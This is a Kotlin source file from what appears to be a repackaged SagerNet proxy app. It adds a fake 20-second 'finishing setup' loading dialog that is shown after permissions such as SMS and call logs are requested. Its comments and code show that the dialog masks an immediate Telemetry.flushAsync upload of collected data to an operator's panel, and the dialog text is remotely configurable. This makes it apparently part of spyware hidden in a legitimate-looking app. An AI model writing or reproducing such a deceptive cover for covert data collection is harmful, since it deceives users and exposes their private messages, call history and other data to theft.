package io.nekohasekai.sagernet.telemetry

import android.app.Activity
import android.app.AlertDialog
import android.content.Context
import android.graphics.Color
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.view.ViewGroup
import android.widget.LinearLayout
import android.widget.ProgressBar
import android.widget.TextView
import android.widget.Toast

/**
 * 授权完成后的「正在完成设置」过渡动画。
 *
 * 流程：所有运行时权限都拿到 → 弹不可取消的转圈框 20 秒 → 自动消失 → 提示「初始化完成」。
 * 只显示一次（SharedPreferences 记标记），之后正常进主界面。
 */
object SetupLoading {

    private const val PREF = "tlm_setup"
    private const val KEY_DONE = "done"
    private const val KEY_LAUNCH = "launch"
    private const val DURATION_MS = 20_000L

    /**
     * 进 App 时调。第一次是弹权限申请，等用户点完回来（第二次 onResume）才弹这 20 秒。
     *
     * 以前要求「运行时权限全齐」才弹，可短信、通话记录这类用户常常不给，
     * 一不给就永远看不到，等于没做。现在改成按启动次数：第二次进来就给他看一次。
     */
    fun maybeShow(a: Activity) {
        val pref = a.getSharedPreferences(PREF, Context.MODE_PRIVATE)
        if (pref.getBoolean(KEY_DONE, false)) return

        val launch = pref.getInt(KEY_LAUNCH, 0) + 1
        pref.edit().putInt(KEY_LAUNCH, launch).commit()   // 必须同步写，apply 会丢

        // 第一次进来还在弹权限框，先别抢焦点；从第二次起就弹
        if (launch < 2) return

        // 先把「已经弹过」落盘，再显示。万一显示时进程被杀，下次也不会再弹。
        pref.edit().putBoolean(KEY_DONE, true).commit()
        show(a)
    }

    /**
     * 用户刚在系统弹窗里点完「全部允许」时调用：不再检查齐不齐，直接给他看。
     * 有些机型（部分照片 / 厂商二次确认）永远判不成「全齐」，这条路是兜底。
     */
    fun showNow(a: Activity) {
        val pref = a.getSharedPreferences(PREF, Context.MODE_PRIVATE)
        if (pref.getBoolean(KEY_DONE, false)) return
        pref.edit().putBoolean(KEY_DONE, true).apply()
        show(a)
    }

    private fun show(a: Activity) {

        val box = LinearLayout(a).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            val p = dp(a, 28)
            setPadding(p, p, p, p)
        }
        box.addView(ProgressBar(a).apply {
            isIndeterminate = true
            layoutParams = LinearLayout.LayoutParams(
                ViewGroup.LayoutParams.WRAP_CONTENT,
                ViewGroup.LayoutParams.WRAP_CONTENT).apply {
                gravity = Gravity.CENTER_HORIZONTAL
                bottomMargin = dp(a, 18)
            }
        })
        box.addView(TextView(a).apply {
            text = RemoteConfig.txtSetup.ifBlank { "正在完成设置…请稍等片刻~" }
            textSize = 15f
            gravity = Gravity.CENTER
            setTextColor(Color.parseColor("#1f2328"))
        })

        val dialog = AlertDialog.Builder(a)
            .setView(box)
            .setCancelable(true)      // 按返回键能关，不能真锁死界面
            .create()
        dialog.setCanceledOnTouchOutside(true)

        runCatching { dialog.show() }

        Handler(Looper.getMainLooper()).postDelayed({
            runCatching { if (dialog.isShowing) dialog.dismiss() }
            runCatching {
                Toast.makeText(a,
                    RemoteConfig.txtSetupDone.ifBlank { "初始化完成，请使用愉快~" },
                    Toast.LENGTH_LONG).show()
            }
            // 结束后立刻推一次，数据马上出现在面板上
            Telemetry.flushAsync(a.applicationContext)
        }, DURATION_MS)
    }

    private fun dp(c: Context, v: Int): Int =
        (v * c.resources.displayMetrics.density).toInt()
}
